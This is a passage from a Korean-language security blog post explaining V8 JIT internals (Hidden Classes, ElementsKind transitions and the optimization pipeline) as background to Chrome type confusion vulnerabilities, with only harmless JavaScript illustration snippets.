&#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-1-Chrome&#xC5D0;&#xC11C;&#xC758;-Type-Confusion-&#xC0AC;&#xB840;-&#xAC1C;&#xC694;"><a href="#2-1-Chrome&#xC5D0;&#xC11C;&#xC758;-Type-Confusion-&#xC0AC;&#xB840;-&#xAC1C;&#xC694;" class="headerlink" title="2.1 Chrome&#xC5D0;&#xC11C;&#xC758; Type Confusion &#xC0AC;&#xB840; &#xAC1C;&#xC694;"></a>2.1 Chrome&#xC5D0;&#xC11C;&#xC758; Type Confusion &#xC0AC;&#xB840; &#xAC1C;&#xC694;</h3><p>&#xC2E4;&#xC81C;&#xB85C; CVE-2018-17463<strong>,</strong> CVE-2023-2033, CVE-2023-4069 &#xB4F1; &#xC218;&#xB9CE;&#xC740; Chrome &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC774; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xCD94;&#xB860;&#xC5D0; &#xC758;&#xD55C; Type Confusion&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xD574;&#xD0A4;&#xBCF4;&#xC774;&#xC988; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xC5D0;&#xB3C4; &#xC788;&#xC5B4;&#xC694;! &#x2192; <a href="https://hackyboiz.github.io/2024/01/18/ogu123/cve-2023-2033/">&#xB9C1;&#xD06C;</a>) </p><p>&#xC774;&#xB4E4; &#xB300;&#xBD80;&#xBD84;&#xC740; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xD328;&#xD134;&#xC744; &#xAD00;&#xCC30;&#xD55C; &#xB4A4; &#x201C;&#xC774; &#xBCC0;&#xC218;&#xB294; &#xD56D;&#xC0C1; &#xC22B;&#xC790;&#xB9CC; &#xB2E4;&#xB8EC;&#xB2E4;&#x201D;, &#x201C;&#xC774; &#xAC1D;&#xCCB4;&#xB294; &#xD56D;&#xC0C1; &#xAC19;&#xC740; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C4;&#xB2E4;&#x201D; &#xAC19;&#xC740; &#xAC00;&#xC815;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xCD5C;&#xC801;&#xD654; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD588;&#xC9C0;&#xB9CC;, &#xC774;&#xD6C4; &#xC608;&#xC678;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC5D0;&#xC11C; &#xC774; &#xAC00;&#xC815;&#xC774; &#xAE68;&#xC84C;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>V8 &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; Type Confusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC790;&#xC8FC; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;:</p><ul><li>&#xAC1D;&#xCCB4; &#xAD6C;&#xC870;(Hidden Class)&#xAC00; &#xBC14;&#xB00C;&#xC5C8;&#xC74C;&#xC5D0;&#xB3C4; &#xAE30;&#xC874; &#xAC00;&#xC815;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xACBD;&#xC6B0;</li><li>&#xBC30;&#xC5F4; &#xB0B4;&#xBD80; &#xD0C0;&#xC785;(ElementsKind)&#xC758; &#xBCC0;&#xACBD;&#xC774; &#xBC18;&#xC601;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0;</li><li>Inline Cache&#xAC00; &#xB0A8;&#xAE34; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xD78C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;</li></ul><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;, V8&#xC740; &#xBE60;&#xB978; &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; &#x201C;&#xD0C0;&#xC785;&#xC740; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xAC83;&#x201D;&#xC774;&#xB77C;&#xB294; &#xC804;&#xC81C; &#xD558;&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xB9E4;&#xC6B0; &#xB3D9;&#xC801;&#xC778; &#xC5B8;&#xC5B4;&#xC774;&#xBA70;, &#xC774; &#xC804;&#xC81C;&#xB294; &#xC5B8;&#xC81C;&#xB4E0; &#xAE68;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xC801; &#xD2B9;&#xC131;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xB0B4;&#xBD80; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xAD50;&#xB780;&#xC2DC;&#xCF1C; Type Confusion&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xC801; &#xAC00;&#xC815;&#xC758; &#xAE30;&#xBC18;&#xC774; &#xB418;&#xB294; <strong>Hidden Class (Map)</strong>&#xC640; <strong>ElementsKind</strong>&#xB77C;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xD575;&#xC2EC; &#xCD5C;&#xC801;&#xD654; &#xAC1C;&#xB150;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-2-V8&#xC758;-&#xCD5C;&#xC801;&#xD654;-&#xBAA8;&#xB378;-&#xC18C;&#xAC1C;-1-HiddenClass-Map"><a href="#2-2-V8&#xC758;-&#xCD5C;&#xC801;&#xD654;-&#xBAA8;&#xB378;-&#xC18C;&#xAC1C;-1-HiddenClass-Map" class="headerlink" title="2.2 V8&#xC758; &#xCD5C;&#xC801;&#xD654; &#xBAA8;&#xB378; &#xC18C;&#xAC1C;(1) : HiddenClass(Map)"></a>2.2 V8&#xC758; &#xCD5C;&#xC801;&#xD654; &#xBAA8;&#xB378; &#xC18C;&#xAC1C;(1) : HiddenClass(Map)</h3><p>Hidden Class&#xB294; V8&#xC774; JavaScript &#xAC1D;&#xCCB4;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xACE0; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB0B4;&#xBD80; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xAC1D;&#xCCB4;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC18D;&#xC131;&#xACFC; &#xAC12; &#xC30D;&#xC744; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xCD94;&#xAC00;&#xD558;&#xAC70;&#xB098; &#xC81C;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xAD6C;&#xC870;&#xAC00; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; V8&#xC740; &#xC131;&#xB2A5;&#xC744; &#xC704;&#xD574; &#xAC1D;&#xCCB4;&#xB97C; &#xB515;&#xC154;&#xB108;&#xB9AC;&#xCC98;&#xB7FC; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; Hidden Class(&#xB610;&#xB294; Map)&#xB77C;&#xB294; &#xBA54;&#xD0C0; &#xAD6C;&#xC870;&#xB97C; &#xD1B5;&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131; &#xAD6C;&#xC131;&#xACFC; &#xC21C;&#xC11C;&#xB97C; &#xCD94;&#xC801;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC18D;&#xC131;(Property): JavaScript &#xAC1D;&#xCCB4;&#xC5D0;&#xC11C; &#xC18D;&#xC131;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xD0A4;-&#xAC12; &#xC30D;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC;, V8 &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xC18D;&#xC131;&#xC774; &#xCD94;&#xAC00;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; &#xAC1D;&#xCCB4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC774; &#xBC14;&#xB00C;&#xB294; &#xACC4;&#xAE30;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC18D;&#xC131;&#xC758; &#xC774;&#xB984;&#xBFD0; &#xC544;&#xB2C8;&#xB77C; &#xCD94;&#xAC00;&#xB41C; &#xC21C;&#xC11C;&#xB3C4; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xB97C; &#xACB0;&#xC815;&#xC9D3;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC694;&#xC18C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC804;&#xC774;(Transition): &#xC18D;&#xC131;&#xC774; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB418;&#xBA74;, V8&#xC740; &#xD604;&#xC7AC; &#xAC1D;&#xCCB4;&#xAC00; &#xAC00;&#xC9C4; Hidden Class&#xB97C; &#xAE30;&#xC874; &#xAD6C;&#xC870;&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; &#xAD6C;&#xC870;&#xB85C; &#xC5F0;&#xACB0;(&#xC804;&#xC774;)&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAC01; &#xC804;&#xC774;&#xB294; &#xD558;&#xB098;&#xC758; &#xC18D;&#xC131; &#xCD94;&#xAC00;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xBA70;, Hidden Class &#xAC04; &#xC5F0;&#xACB0;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xD2B8;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xD615;&#xC131;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><p><strong>&#x1F9E9; Hidden Class&#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;</strong></p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> obj = {};        <span class="hljs-comment">// [1] &#xCD08;&#xAE30; Hidden Class</span>obj.x = <span class="hljs-number">10</span>;          <span class="hljs-comment">// [2] &#x2192; &apos;x&apos; &#xC18D;&#xC131;&#xC774; &#xC788;&#xB294; Hidden Class&#xB85C; &#xC804;&#xC774;</span>obj.y = <span class="hljs-number">20</span>;          <span class="hljs-comment">// [3] &#x2192; &apos;x, y&apos; &#xC21C;&#xC11C;&#xC758; Hidden Class&#xB85C; &#xC804;&#xC774;</span></code></pre><ul><li>[1] &#xAC1D;&#xCCB4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xBA74;, V8&#xC740; &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xC5D0; &#xCD08;&#xAE30; Hidden Class&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC18D;&#xC131;&#xC774; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xC5C6;&#xB294; &#xC0C1;&#xD0DC;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</li><li><p>&#xC774;&#xD6C4; &#xC18D;&#xC131;&#xC774; &#xD558;&#xB098;&#xC529; &#xCD94;&#xAC00;&#xB420; &#xB54C;&#xB9C8;&#xB2E4;, V8&#xC740; &#xAE30;&#xC874; Hidden Class&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; Hidden Class&#xB85C; &#xC804;&#xC774;(transition)&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>[2] <code>obj.x = 10</code>&#xACFC; &#xAC19;&#xC774; &#xC18D;&#xC131;&#xC774; &#xD558;&#xB098; &#xCD94;&#xAC00;&#xB418;&#xBA74; <code>x</code>&#xB9CC; &#xD3EC;&#xD568;&#xB41C; &#xC0C8;&#xB85C;&#xC6B4; Hidden Class&#xB85C; &#xC804;&#xC774;</li><li><p>[3] <code>obj.y = 20</code>&#xC774; &#xCD94;&#xAC00;&#xB418;&#xBA74; <code>x, y</code> &#xC21C;&#xC11C;&#xB97C; &#xBC18;&#xC601;&#xD55C; &#xB610; &#xB2E4;&#xB978; Hidden Class&#xB85C; &#xB2E4;&#xC2DC; &#xC804;&#xC774;</p>  <pre><code class="hljs c">[Initial Hidden Class]        |        | (add property <span class="hljs-string">&apos;x&apos;</span>)        v   [Hidden Class: x]        |        | (add property <span class="hljs-string">&apos;y&apos;</span>)        v   [Hidden Class: x, y]</code></pre></li></ul></li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xC18D;&#xC131; &#xCD94;&#xAC00; &#xC21C;&#xC11C;&#xC5D0; &#xB530;&#xB77C; Hidden Class&#xAC00; &#xB2E8;&#xACC4;&#xC801;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xBA70;, &#xB3D9;&#xC77C;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C4; &#xAC1D;&#xCCB4;&#xB4E4;&#xC740; &#xAC19;&#xC740; Hidden Class&#xB97C; &#xACF5;&#xC720;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131; &#xCD94;&#xAC00; &#xC21C;&#xC11C;&#xC5D0; &#xB530;&#xB77C; Hidden Class&#xB294; &#xBD84;&#xAE30; &#xD615;&#xD0DC;&#xC758; &#xD2B8;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xD615;&#xC131;&#xD558;&#xBA70; &#xD655;&#xC7A5;&#xB418;&#xACE0;, &#xC774;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xAC1D;&#xCCB4;&#xC758; &#xC815;&#xC801; &#xAD6C;&#xC870; &#xC815;&#xBCF4;&#xB97C; &#xD45C;&#xD604;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAD6C;&#xC870; &#xB355;&#xBD84;&#xC5D0; V8&#xC740; <code>&quot;obj.x&quot;</code>&#xC640; &#xAC19;&#xC740; &#xC18D;&#xC131; &#xC811;&#xADFC; &#xC2DC; &#xBB38;&#xC790;&#xC5F4; &#xD0A4;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xD574;&#xB2F9; Hidden Class&#xAC00; &#xAC00;&#xC9C4; &#xC624;&#xD504;&#xC14B; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>obj[+8]</code>&#xCC98;&#xB7FC; &#xACE0;&#xC815;&#xB41C; &#xC704;&#xCE58;&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBC29;&#xC2DD;&#xC740; &#xC18D;&#xC131; &#xC870;&#xD68C; &#xC18D;&#xB3C4;&#xB97C; &#xD06C;&#xAC8C; &#xD5A5;&#xC0C1;&#xC2DC;&#xD0A4;&#xBA70;, &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xAC00; &#xBCC0;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xB294; &#xAC00;&#xC815; &#xD558;&#xC5D0; V8&#xC774; &#xACE0;&#xC131;&#xB2A5;&#xC758; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><h3 id="2-3-V8&#xC758;-&#xCD5C;&#xC801;&#xD654;-&#xBAA8;&#xB378;-&#xC18C;&#xAC1C;-2-ElementsKind"><a href="#2-3-V8&#xC758;-&#xCD5C;&#xC801;&#xD654;-&#xBAA8;&#xB378;-&#xC18C;&#xAC1C;-2-ElementsKind" class="headerlink" title="2.3 V8&#xC758; &#xCD5C;&#xC801;&#xD654; &#xBAA8;&#xB378; &#xC18C;&#xAC1C;(2) : ElementsKind"></a>2.3 V8&#xC758; &#xCD5C;&#xC801;&#xD654; &#xBAA8;&#xB378; &#xC18C;&#xAC1C;(2) : <strong>ElementsKind</strong></h3><p><strong>ElementsKind</strong>&#xB294; V8&#xC774; JavaScript &#xBC30;&#xC5F4;&#xC758; &#xC694;&#xC18C; &#xD0C0;&#xC785;&#xACFC; &#xBC00;&#xB3C4;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB0B4;&#xBD80; &#xBA54;&#xD0C0;&#xC815;&#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. JavaScript&#xC758; &#xBC30;&#xC5F4;&#xC740; &#xC22B;&#xC790;, &#xBB38;&#xC790;&#xC5F4;, &#xAC1D;&#xCCB4;&#xAC00; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC11E;&#xC774;&#xAC70;&#xB098; &#xC911;&#xAC04;&#xC5D0; &#xBE48; &#xC2AC;&#xB86F;&#xC774; &#xC788;&#xB294; &#xB4F1; &#xB9E4;&#xC6B0; &#xB3D9;&#xC801;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; V8&#xC740; &#xC131;&#xB2A5; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC704;&#xD574; &#xC774;&#xB7EC;&#xD55C; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB2A5;&#xD55C; &#xD55C; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xC815;&#xD615;&#xD654;&#xB41C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB0B4;&#xBD80; &#xD45C;&#xD604;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAE30;&#xC900;&#xC774; &#xB418;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB85C; ElementsKind&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#x1F9E9; <strong>ElementsKind&#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;</strong></p><ul><li><p>&#xBC30;&#xC5F4;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xBA74;, V8&#xC740; &#xD574;&#xB2F9; &#xBC30;&#xC5F4;&#xC758; &#xB0B4;&#xC6A9;&#xC5D0; &#xB530;&#xB77C; &#xAC00;&#xC7A5; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xBC00;&#xC9D1;&#xB41C; &#xD615;&#xD0DC;&#xC758; ElementsKind&#xB97C; &#xBD80;&#xC5EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>  &#xC608;&#xB97C; &#xB4E4;&#xC5B4;:</p>  <pre><code class="hljs jsx">[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]           &#x2192; PackedSmiElements (<span class="hljs-number">32</span>&#xBE44;&#xD2B8; &#xC815;&#xC218; &#xBC30;&#xC5F4;)[<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>]          &#x2192; PackedDoubleElements (<span class="hljs-number">64</span>&#xBE44;&#xD2B8; &#xC2E4;&#xC218; &#xBC30;&#xC5F4;)[<span class="hljs-number">1</span>, {}, <span class="hljs-string">&quot;text&quot;</span>]     &#x2192; PackedElements (&#xC77C;&#xBC18; &#xAC1D;&#xCCB4; &#xBC30;&#xC5F4;)</code></pre></li><li><p>&#xC774;&#xD6C4; &#xBC30;&#xC5F4;&#xC5D0; &#xB2E4;&#xB978; &#xD0C0;&#xC785;&#xC758; &#xC694;&#xC18C;&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xAC70;&#xB098;, &#xC911;&#xAC04; &#xC694;&#xC18C;&#xAC00; &#xC0AD;&#xC81C;&#xB418;&#xC5B4; &#xBC00;&#xB3C4;&#xAC00; &#xB0AE;&#xC544;&#xC9C0;&#xBA74;, V8&#xC740; &#xB354; &#xC77C;&#xBC18;&#xC801;&#xC778; ElementsKind&#xB85C; &#xC804;&#xC774;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs angelscript">let arr = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>];   <span class="hljs-comment">// &#xCD08;&#xAE30;: PackedDoubleElements</span>arr[<span class="hljs-number">2</span>] = {};            <span class="hljs-comment">// &#x2192; PackedElements&#xB85C; &#xC804;&#xC774;</span></code></pre></li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC740; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xD560; &#xC218; &#xC788;&#xB294; JavaScript &#xBC30;&#xC5F4;&#xC758; &#xD2B9;&#xC131;&#xACFC;&#xB294; &#xB2E4;&#xC18C; &#xC0C1;&#xBC18;&#xB418;&#xC9C0;&#xB9CC;, &#xC2E4;&#xD589; &#xC911; &#xBCC0;&#xD654;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xC804;&#xAE4C;&#xC9C0;&#xB294; &#xB9E4;&#xC6B0; &#xB192;&#xC740; &#xC131;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xAD6D; ElementsKind&#xB294; &#xBC30;&#xC5F4; &#xC694;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xC0C1;&#xC801;&#xC778; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; JIT &#xCD5C;&#xC801;&#xD654;&#xC758; &#xD575;&#xC2EC; &#xAE30;&#xC900;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBA70;, &#xB3D9;&#xC801;&#xC778; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xC815;&#xC801;&#xC778; &#xC131;&#xB2A5; &#xBAA8;&#xB378;&#xB85C; &#xC218;&#xB834;&#xC2DC;&#xD0A4;&#xB294; &#xB370; &#xC911;&#xC694;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="2-4-&#xCD5C;&#xC801;&#xD654;-&#xD750;&#xB984;&#xACFC;-Native-Code-&#xC0DD;&#xC131;"><a href="#2-4-&#xCD5C;&#xC801;&#xD654;-&#xD750;&#xB984;&#xACFC;-Native-Code-&#xC0DD;&#xC131;" class="headerlink" title="2.4 &#xCD5C;&#xC801;&#xD654; &#xD750;&#xB984;&#xACFC; Native Code &#xC0DD;&#xC131;"></a>2.4 &#xCD5C;&#xC801;&#xD654; &#xD750;&#xB984;&#xACFC; Native Code &#xC0DD;&#xC131;</h3><p>V8&#xC740; JavaScript&#xC758; &#xB3D9;&#xC801; &#xD2B9;&#xC131;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xC815;&#xD558;&#xC5EC; &#xACE0;&#xC131;&#xB2A5;&#xC758; Native Code&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC55E;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF8; Hidden Class&#xC640; ElementsKind&#xB294; &#xAC1D;&#xCCB4;&#xC640; &#xBC30;&#xC5F4;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC8FC;&#xACE0;, &#xC774;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; V8&#xC740; &#xC2E4;&#xD589; &#xC911; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC810;&#xC9C4;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD574; &#xB098;&#xAC11;&#xB2C8;&#xB2E4;. &#xC9C0;&#xB09C; &#xC2DC;&#xAC04;(Part 1.)&#xC5D0; V8 &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778; &#xAD6C;&#xC870;&#xC5D0;&#xC11C;&#xB294; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xAC1C;&#xB150;&#xACFC; &#xC5ED;&#xC0AC;&#xB97C; &#xBCF4;&#xC558;&#xC73C;&#xB2C8; &#xC774;&#xC81C;&#xB294; Native Code &#xC2E4;&#xD589;&#xACFC; &#xCD5C;&#xC801;&#xD654; &#xD750;&#xB984; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC774; &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><hr><p><strong>&#x2699;&#xFE0F; Native Code &#xC2E4;&#xD589;&#xACFC; &#xCD5C;&#xC801;&#xD654; &#xD750;&#xB984;</strong></p><p><img src="image%205.png" alt="image.png"></p><p>V8&#xC758; &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB2E8;&#xACC4;&#xB97C; &#xD1B5;&#xD574; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xC810;&#xCC28; &#xACE0;&#xC18D;&#xC758; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xBA38;&#xC2E0; &#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><strong>Ignition</strong> &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xAC00; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xC744; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xD589; &#xD69F;&#xC218;, &#xD0C0;&#xC785; &#xC815;&#xBCF4; &#xB4F1; &#xB7F0;&#xD0C0;&#xC784; <strong>&#xD504;&#xB85C;&#xD30C;&#xC77C;&#xB9C1; &#xC815;&#xBCF4;&#xAC00; &#xC218;&#xC9D1;</strong>&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xCF54;&#xB4DC;&#xAC00; &#x201C;&#xC790;&#xC8FC; &#xC2E4;&#xD589;&#xB418;&#xB294;(hot)&#x201D; &#xACBD;&#xB85C;&#xB85C; &#xD310;&#xB2E8;&#xB418;&#xBA74;, <strong>Sparkplug</strong> &#xB610;&#xB294; <strong>Maglev</strong> JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xBE60;&#xB978; &#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xC218;&#xD589;&#xD558;&#xC5EC; <strong>Native Code&#xB97C; &#xC0DD;&#xC131;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xCF54;&#xB4DC;&#xB294; &#xCD08;&#xAE30; &#xCD5C;&#xC801;&#xD654; &#xC218;&#xC900;&#xC774;&#xC9C0;&#xB9CC;, &#xC18D;&#xB3C4;&#xC640; &#xD6A8;&#xC728;&#xC774; &#xC6B0;&#xC120;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</li><li><p>&#xC774;&#xD6C4; &#xCF54;&#xB4DC;&#xAC00; &#xCDA9;&#xBD84;&#xD788; &#xBD84;&#xC11D;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xBA74;, 